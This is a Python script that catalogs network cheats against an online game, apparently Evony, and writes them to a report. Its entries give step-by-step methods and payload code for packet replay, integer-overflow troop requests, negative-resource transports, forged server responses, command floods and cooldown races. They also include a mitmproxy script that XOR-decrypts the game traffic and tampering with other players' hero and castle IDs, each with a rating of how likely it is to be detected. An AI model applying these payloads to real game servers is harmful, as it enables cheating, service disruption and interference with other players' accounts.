#!/usr/bin/env python3
"""
Network Exploit Finder - Discovers all network-level cheat opportunities
Finds packet manipulation, replay attacks, injection points
"""

import sys
import json
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

sys.path.insert(0, str(Path(__file__).parent.parent))

class NetworkExploitType(Enum):
    PACKET_REPLAY = "packet_replay"
    PACKET_MODIFY = "packet_modify"
    PACKET_INJECT = "packet_inject"
    SEQUENCE_BREAK = "sequence_break"
    FLOOD_ATTACK = "flood_attack"
    TIMING_ATTACK = "timing_attack"
    MITM_INTERCEPT = "mitm_intercept"
    PARAMETER_TAMPER = "parameter_tamper"

@dataclass
class NetworkExploit:
    name: str
    exploit_type: NetworkExploitType
    target_command: str
    description: str
    method: str
    payload_example: str
    detection_risk: str
    cheat_result: str

# All network exploits that can be performed
NETWORK_EXPLOITS = [
    # PACKET REPLAY ATTACKS
    NetworkExploit(
        name="Troop Training Replay",
        exploit_type=NetworkExploitType.PACKET_REPLAY,
        target_command="troop.produceTroop",
        description="Capture and replay troop training packet",
        method="""
1. Capture packet for troop.produceTroop
2. Save raw AMF bytes
3. Replay packet multiple times
4. Server may process each as new request
5. Train troops without client validation
""",
        payload_example="""
# Captured packet structure
{
    "cmd": "troop.produceTroop",
    "params": {
        "castleId": 12345,
        "troopType": 6,  # Archer
        "num": 1000
    }
}

# Replay 10 times = 10,000 archers
for i in range(10):
    socket.send(captured_packet)
""",
        detection_risk="LOW - Identical requests common",
        cheat_result="Train 10x troops from single request"
    ),
    
    NetworkExploit(
        name="Resource Collection Replay",
        exploit_type=NetworkExploitType.PACKET_REPLAY,
        target_command="interior.taxRate (exploit variant)",
        description="Replay resource collection to multiply gains",
        method="""
1. Capture tax collection or resource harvest
2. Replay packet rapidly
3. May collect multiple times
""",
        payload_example="""
# Capture gold collection packet
# Replay before server updates state
""",
        detection_risk="MEDIUM - Unusual collection frequency",
        cheat_result="Multiply resource collection"
    ),
    
    # PACKET MODIFICATION ATTACKS
    NetworkExploit(
        name="Troop Count Modification",
        exploit_type=NetworkExploitType.PACKET_MODIFY,
        target_command="troop.produceTroop",
        description="Modify num parameter to bypass client limits",
        method="""
1. Intercept outgoing troop.produceTroop
2. Modify 'num' parameter
3. Set to overflow value (6135037 for archers)
4. Forward modified packet
5. Trigger integer overflow
""",
        payload_example="""
# Original packet
{"cmd": "troop.produceTroop", "params": {"num": 100}}

# Modified packet (overflow threshold)
{"cmd": "troop.produceTroop", "params": {"num": 6135037}}

# Cost: 6135037 * 350 = 2,147,262,950 (overflows to ~-2B)
""",
        detection_risk="LOW - Server trusts client values",
        cheat_result="Free troops via integer overflow"
    ),
    
    NetworkExploit(
        name="Negative Resource Transport",
        exploit_type=NetworkExploitType.PACKET_MODIFY,
        target_command="army.newArmy",
        description="Send negative resources to steal from target",
        method="""
1. Intercept transport army creation
2. Modify resource string to negative values
3. Server may interpret as receiving resources
""",
        payload_example="""
# Normal transport
{"cmd": "army.newArmy", "params": {
    "missionType": 4,
    "resource": "1000,1000,1000,1000,1000"
}}

# Exploit - negative values
{"cmd": "army.newArmy", "params": {
    "missionType": 4,
    "resource": "-999999,-999999,-999999,-999999,-999999"
}}
""",
        detection_risk="MEDIUM - Unusual values logged",
        cheat_result="Drain target's resources or gain resources"
    ),
    
    NetworkExploit(
        name="Building Level Skip",
        exploit_type=NetworkExploitType.PACKET_MODIFY,
        target_command="castle.upgradeBuilding",
        description="Modify building parameters to skip requirements",
        method="""
1. Intercept upgrade request
2. Modify to claim higher level completion
3. Server may not fully validate requirements
""",
        payload_example="""
# If server accepts level in request
{"cmd": "castle.upgradeBuilding", "params": {
    "positionId": 1001,
    "targetLevel": 10  # Jump straight to 10
}}
""",
        detection_risk="HIGH - Server likely validates",
        cheat_result="Skip building requirements"
    ),
    
    # PACKET INJECTION ATTACKS
    NetworkExploit(
        name="Fake Server Response Injection",
        exploit_type=NetworkExploitType.PACKET_INJECT,
        target_command="(response injection)",
        description="Inject fake server responses to client",
        method="""
1. MITM position between client and server
2. Craft fake server response
3. Inject to client before real response
4. Client accepts fake data
""",
        payload_example="""
# Fake troop update response
{
    "event": "SERVER_TROOP_UPDATE",
    "data": {
        "troop": {
            "archer": 999999999,
            "catapult": 999999999
        }
    }
}
# Client displays fake troop counts
""",
        detection_risk="NONE client-side",
        cheat_result="Display unlimited troops (visual only)"
    ),
    
    NetworkExploit(
        name="Resource Response Injection",
        exploit_type=NetworkExploitType.PACKET_INJECT,
        target_command="SERVER_RESOURCE_UPDATE",
        description="Inject fake resource values",
        method="""
1. Intercept SERVER_RESOURCE_UPDATE
2. Modify resource amounts
3. Forward to client
4. Client shows unlimited resources
""",
        payload_example="""
# Inject modified resource update
{
    "gold": {"amount": 2147483647},
    "food": {"amount": 2147483647},
    "wood": {"amount": 2147483647},
    "stone": {"amount": 2147483647},
    "iron": {"amount": 2147483647}
}
""",
        detection_risk="NONE client-side",
        cheat_result="Display unlimited resources"
    ),
    
    # SEQUENCE BREAKING
    NetworkExploit(
        name="Command Sequence Skip",
        exploit_type=NetworkExploitType.SEQUENCE_BREAK,
        target_command="(multiple commands)",
        description="Skip prerequisite commands",
        method="""
1. Normally: check -> request -> confirm
2. Skip directly to confirm/action
3. Bypass prerequisite checks
""",
        payload_example="""
# Skip building check, send upgrade directly
# Skip hero hire, send assignment directly
# Skip research check, send complete directly
""",
        detection_risk="MEDIUM - Missing state updates",
        cheat_result="Bypass multi-step validations"
    ),
    
    NetworkExploit(
        name="Out-of-Order Army Commands",
        exploit_type=NetworkExploitType.SEQUENCE_BREAK,
        target_command="army.*",
        description="Send army commands in unexpected order",
        method="""
1. Send army recall before army arrives
2. Send attack completion before march
3. Server state desync may allow exploits
""",
        payload_example="""
# Send in wrong order
send("army.newArmy", {...})  # Create army
send("army.callBackArmy", {...})  # Recall immediately
# Troops may duplicate or resources refund
""",
        detection_risk="MEDIUM",
        cheat_result="Potential resource duplication"
    ),
    
    # FLOOD ATTACKS
    NetworkExploit(
        name="Command Flood",
        exploit_type=NetworkExploitType.FLOOD_ATTACK,
        target_command="(any command)",
        description="Rapidly send same command before server processes",
        method="""
1. Disable client-side cooldowns
2. Send commands as fast as possible
3. Server queue may process all before validation
""",
        payload_example="""
import socket
# Flood troop training
for _ in range(1000):
    s.send(train_packet)
    # No delay, maximum speed
""",
        detection_risk="HIGH - Rate limit detection",
        cheat_result="Bypass cooldowns, multiply actions"
    ),
    
    NetworkExploit(
        name="Scout Flood",
        exploit_type=NetworkExploitType.FLOOD_ATTACK,
        target_command="army.newArmy (scout)",
        description="Send unlimited scouts simultaneously",
        method="""
1. Rapid-fire scout commands
2. Before server applies scout limit
3. May send more scouts than allowed
""",
        payload_example="""
# Flood scout missions
for target in targets:
    send("army.newArmy", {
        "missionType": 3,  # Scout
        "targetX": target[0],
        "targetY": target[1]
    })
""",
        detection_risk="MEDIUM",
        cheat_result="Scout entire map rapidly"
    ),
    
    # TIMING ATTACKS
    NetworkExploit(
        name="Cooldown Race",
        exploit_type=NetworkExploitType.TIMING_ATTACK,
        target_command="(cooldown-limited commands)",
        description="Send command exactly when cooldown expires",
        method="""
1. Track server cooldown precisely
2. Send command at exact millisecond of expiry
3. May process before cooldown check
""",
        payload_example="""
# Wait for exact cooldown end
import time
cooldown_end = time.time() + server_cooldown
time.sleep(cooldown_end - time.time() - 0.001)
send_command()  # Race the cooldown
""",
        detection_risk="LOW",
        cheat_result="Bypass cooldown by milliseconds"
    ),
    
    NetworkExploit(
        name="Server Time Desync",
        exploit_type=NetworkExploitType.TIMING_ATTACK,
        target_command="(time-based commands)",
        description="Exploit client-server time difference",
        method="""
1. Determine server time offset
2. Send commands timed for server's future
3. May process before local display updates
""",
        payload_example="""
# If server is 100ms ahead
# Send building complete before client shows done
# May trigger double rewards
""",
        detection_risk="LOW",
        cheat_result="Early action execution"
    ),
    
    # MITM INTERCEPT
    NetworkExploit(
        name="Full Packet Interception",
        exploit_type=NetworkExploitType.MITM_INTERCEPT,
        target_command="(all traffic)",
        description="Intercept and log all game traffic",
        method="""
1. Set up proxy (Burp, mitmproxy, custom)
2. Configure client to use proxy
3. Decrypt AMF packets (XOR 0xAA)
4. Log all commands and responses
5. Analyze for exploit opportunities
""",
        payload_example="""
# mitmproxy script
from mitmproxy import ctx

def request(flow):
    if "evony" in flow.request.host:
        # Decrypt XOR
        data = bytes([b ^ 0xAA for b in flow.request.content])
        ctx.log.info(f"Request: {data}")

def response(flow):
    if "evony" in flow.request.host:
        data = bytes([b ^ 0xAA for b in flow.response.content])
        ctx.log.info(f"Response: {data}")
""",
        detection_risk="NONE - Passive",
        cheat_result="Complete protocol understanding"
    ),
    
    NetworkExploit(
        name="Selective Packet Drop",
        exploit_type=NetworkExploitType.MITM_INTERCEPT,
        target_command="(failure responses)",
        description="Drop server error responses",
        method="""
1. MITM position
2. Identify error/failure responses
3. Drop them, don't forward to client
4. Client thinks action succeeded
""",
        payload_example="""
def response(flow):
    data = decrypt(flow.response.content)
    if '"ok": 0' in data or '"error"' in data:
        flow.kill()  # Drop error response
""",
        detection_risk="MEDIUM - State desync",
        cheat_result="Client ignores failures"
    ),
    
    # PARAMETER TAMPERING
    NetworkExploit(
        name="Hero ID Tampering",
        exploit_type=NetworkExploitType.PARAMETER_TAMPER,
        target_command="hero.* commands",
        description="Use other player's hero IDs",
        method="""
1. Obtain other player's hero IDs (from reports/battles)
2. Send commands with their hero IDs
3. May affect their heroes
""",
        payload_example="""
# Use captured enemy hero ID
{"cmd": "hero.fireHero", "params": {"heroId": 999888}}
# May fire their hero (unlikely but worth testing)
""",
        detection_risk="HIGH - Permission check likely",
        cheat_result="Manipulate other players' heroes"
    ),
    
    NetworkExploit(
        name="Castle ID Tampering",
        exploit_type=NetworkExploitType.PARAMETER_TAMPER,
        target_command="castle.* commands",
        description="Send commands for other castles",
        method="""
1. Obtain other player's castle IDs
2. Send commands targeting their castle
3. Server may not validate ownership
""",
        payload_example="""
# Train troops in enemy castle?
{"cmd": "troop.produceTroop", "params": {
    "castleId": 987654,  # Enemy castle
    "troopType": 6,
    "num": 1000
}}
""",
        detection_risk="HIGH - Ownership check likely",
        cheat_result="Control other players' castles"
    ),
    
    NetworkExploit(
        name="Coordinate Boundary Bypass",
        exploit_type=NetworkExploitType.PARAMETER_TAMPER,
        target_command="army.newArmy",
        description="Send armies to out-of-bounds coordinates",
        method="""
1. Normal coords: 0-799, 0-799
2. Try negative or >799 coords
3. May cause server errors or exploits
""",
        payload_example="""
# Out of bounds coordinates
{"cmd": "army.newArmy", "params": {
    "targetX": -1,
    "targetY": 999
}}
# Or
{"cmd": "army.newArmy", "params": {
    "targetX": 2147483647,  # MAX_INT
    "targetY": 2147483647
}}
""",
        detection_risk="MEDIUM",
        cheat_result="Server error or boundary exploit"
    ),
]


class NetworkExploitFinder:
    """Finds and catalogs network exploits"""
    
    def __init__(self):
        self.exploits = NETWORK_EXPLOITS.copy()
        self.rag = None
        self._init_rag()
    
    def _init_rag(self):
        try:
            from evony_rag.rag_v2 import EvonyRAGv2
            self.rag = EvonyRAGv2()
            self.rag.policy.set_mode("full_access")
            print("[+] RAG initialized")
        except:
            print("[!] RAG not available")
    
    def find_additional_exploits(self):
        """Use RAG to find more network exploits"""
        if not self.rag:
            return
        
        print("\n[*] Searching for additional network exploits...")
        
        # Search for command patterns
        queries = [
            "sendMessage cmd params Socket",
            "URLLoader URLRequest send",
            "responseHandler callback dispatch",
            "sequence packet order timing",
        ]
        
        for query in queries:
            try:
                results = self.rag.search_only(query, k=10)
                for r in results:
                    print(f"  Found: {r.file}")
            except:
                pass
    
    def generate_report(self) -> str:
        """Generate network exploit report"""
        lines = []
        lines.append("# ðŸŒ NETWORK EXPLOIT CATALOG\n\n")
        lines.append(f"**Total Network Exploits:** {len(self.exploits)}\n\n")
        
        # Summary by type
        by_type = {}
        for e in self.exploits:
            t = e.exploit_type.value
            by_type[t] = by_type.get(t, 0) + 1
        
        lines.append("## Summary by Type\n")
        for t, count in sorted(by_type.items(), key=lambda x: -x[1]):
            lines.append(f"- **{t}**: {count}\n")
        
        lines.append("\n---\n")
        
        # Detailed exploits
        for exploit_type in NetworkExploitType:
            exploits = [e for e in self.exploits if e.exploit_type == exploit_type]
            if exploits:
                lines.append(f"\n## {exploit_type.value.upper().replace('_', ' ')}\n")
                for e in exploits:
                    lines.append(self._format_exploit(e))
        
        return "".join(lines)
    
    def _format_exploit(self, e: NetworkExploit) -> str:
        return f"""
### {e.name}
**Target Command:** `{e.target_command}`  
**Detection Risk:** {e.detection_risk}  
**Cheat Result:** {e.cheat_result}

**Description:**
{e.description}

**Method:**
```
{e.method}
```

**Payload Example:**
```python
{e.payload_example}
```

---
"""


def main():
    finder = NetworkExploitFinder()
    finder.find_additional_exploits()
    
    print(f"\n[+] Total network exploits: {len(finder.exploits)}")
    
    report = finder.generate_report()
    output = Path(__file__).parent / "NETWORK_EXPLOITS.md"
    output.write_text(report, encoding="utf-8")
    print(f"[+] Report saved to: {output}")
    
    # Save JSON
    json_path = Path(__file__).parent / "network_exploits.json"
    data = [{"name": e.name, "type": e.exploit_type.value, 
             "command": e.target_command, "risk": e.detection_risk,
             "result": e.cheat_result} for e in finder.exploits]
    json_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    print(f"[+] JSON saved to: {json_path}")


if __name__ == "__main__":
    main()
